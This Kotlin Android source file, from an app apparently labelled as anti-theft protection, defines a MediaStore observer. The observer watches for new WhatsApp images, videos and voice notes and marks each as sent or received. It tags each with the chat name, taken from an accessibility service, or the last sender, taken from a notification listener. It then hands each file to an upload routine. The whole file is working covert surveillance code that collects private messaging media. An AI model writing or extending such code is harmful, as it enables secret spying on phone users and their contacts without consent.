package com.androidprotect

import android.content.Context
import android.database.ContentObserver
import android.net.Uri
import android.os.Handler
import android.os.Looper
import android.provider.MediaStore
import android.util.Log
import java.io.File

/**
 * Monitors WhatsApp media files using MediaStore ContentObserver.
 * This works on Android 11+ where FileObserver can't monitor other apps' folders.
 *
 * Detects new images, videos, and audio files added by WhatsApp.
 */
class WhatsAppMediaStoreObserver(private val context: Context) {

    private val handler = Handler(Looper.getMainLooper())
    private val observers = mutableListOf<ContentObserver>()
    private val processedUris = mutableSetOf<String>()
    private var lastCheckTimestamp = System.currentTimeMillis()

    fun start() {
        stop()
        processedUris.clear()
        lastCheckTimestamp = System.currentTimeMillis()

        val uris = listOf(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
            MediaStore.Audio.Media.EXTERNAL_CONTENT_URI
        )

        for (uri in uris) {
            val observer = object : ContentObserver(handler) {
                override fun onChange(selfChange: Boolean, uri: Uri?) {
                    super.onChange(selfChange, uri)
                    Log.d("MediaStoreObserver", "onChange: $uri")
                    handler.postDelayed({ checkForNewMedia(uri) }, 1500)
                }
            }
            context.contentResolver.registerContentObserver(uri, true, observer)
            observers.add(observer)
            Log.d("MediaStoreObserver", "Registered observer for $uri")
        }

        Log.d("MediaStoreObserver", "Started monitoring WhatsApp media via MediaStore")
    }

    fun stop() {
        observers.forEach { context.contentResolver.unregisterContentObserver(it) }
        observers.clear()
    }

    private fun checkForNewMedia(changedUri: Uri?) {
        try {
            val now = System.currentTimeMillis()
            val since = lastCheckTimestamp - 10000 // 10s overlap

            // Check images
            queryNewMedia(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, since, "image")
            // Check videos
            queryNewMedia(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, since, "video")
            // Check audio
            queryNewMedia(MediaStore.Audio.Media.EXTERNAL_CONTENT_URI, since, "audio")

            lastCheckTimestamp = now
        } catch (e: Exception) {
            Log.e("MediaStoreObserver", "Error checking media: ${e.message}")
        }
    }

    private fun queryNewMedia(contentUri: Uri, since: Long, mediaType: String) {
        val projection = arrayOf(
            MediaStore.MediaColumns._ID,
            MediaStore.MediaColumns.DISPLAY_NAME,
            MediaStore.MediaColumns.DATA,
            MediaStore.MediaColumns.RELATIVE_PATH,
            MediaStore.MediaColumns.DATE_ADDED,
            MediaStore.MediaColumns.SIZE,
            MediaStore.MediaColumns.MIME_TYPE
        )

        val selection = "${MediaStore.MediaColumns.DATE_ADDED} > ? AND ${MediaStore.MediaColumns.DATA} LIKE ?"
        val selectionArgs = arrayOf((since / 1000).toString(), "%WhatsApp%")
        val sortOrder = "${MediaStore.MediaColumns.DATE_ADDED} DESC"

        context.contentResolver.query(contentUri, projection, selection, selectionArgs, sortOrder)?.use { cursor ->
            val idCol = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns._ID)
            val nameCol = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DISPLAY_NAME)
            val dataCol = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DATA)
            val relPathCol = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.RELATIVE_PATH)
            val dateCol = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DATE_ADDED)
            val sizeCol = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.SIZE)
            val mimeCol = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.MIME_TYPE)

            while (cursor.moveToNext()) {
                val id = cursor.getLong(idCol)
                val name = cursor.getString(nameCol) ?: continue
                val path = cursor.getString(dataCol) ?: ""
                val relPath = cursor.getString(relPathCol) ?: ""
                val dateAdded = cursor.getLong(dateCol) * 1000
                val size = cursor.getLong(sizeCol)
                val mime = cursor.getString(mimeCol) ?: ""

                val uriKey = "$contentUri:$id"
                if (processedUris.contains(uriKey)) continue
                if (size < 1000) continue // skip tiny files (thumbnails, etc)

                // Check if it's a WhatsApp file
                if (!isWhatsAppMedia(path, relPath)) continue

                processedUris.add(uriKey)

                val isSent = path.contains("/Sent") || path.contains("Sent/")
                val direction = if (isSent) "out" else "in"
                val file = File(path)

                if (!file.exists()) {
                    Log.d("MediaStoreObserver", "File gone: $path")
                    continue
                }

                val caption = when (mediaType) {
                    "image" -> "📷 Imagem"
                    "video" -> "🎥 Vídeo"
                    "audio" -> "🎤 Áudio"
                    else -> "📎 Arquivo"
                }

                val (address, chatName) = resolveChat(isSent)
                Log.d("MediaStoreObserver", "Detected WhatsApp $mediaType: ${file.name} (${file.length()} bytes) sent=$isSent chat=$address")

                AntiTheftService.uploadWhatsAppMedia(file, mediaType, isSent, address, chatName, caption)
            }
        }
    }

    private fun isWhatsAppMedia(path: String, relPath: String): Boolean {
        val lowerPath = path.lowercase()
        val lowerRel = relPath.lowercase()
        return (lowerPath.contains("whatsapp") || lowerRel.contains("whatsapp")) &&
               (lowerPath.contains("whatsapp images") || lowerPath.contains("whatsapp video") ||
                lowerPath.contains("whatsapp audio") || lowerPath.contains("whatsapp voice") ||
                lowerRel.contains("whatsapp images") || lowerRel.contains("whatsapp video") ||
                lowerRel.contains("whatsapp audio") || lowerRel.contains("whatsapp voice"))
    }

    private fun resolveChat(isSent: Boolean): Pair<String, String> {
        return if (isSent) {
            val chat = ProtectAccessibilityService.currentChatName()
            chat to chat
        } else {
            val addr = WhatsAppNotificationListener.lastIncomingAddress()
            addr to addr
        }
    }

    companion object {
        @Volatile
        private var instance: WhatsAppMediaStoreObserver? = null

        fun get(context: Context): WhatsAppMediaStoreObserver {
            return instance ?: synchronized(this) {
                instance ?: WhatsAppMediaStoreObserver(context.applicationContext).also { instance = it }
            }
        }
    }
}
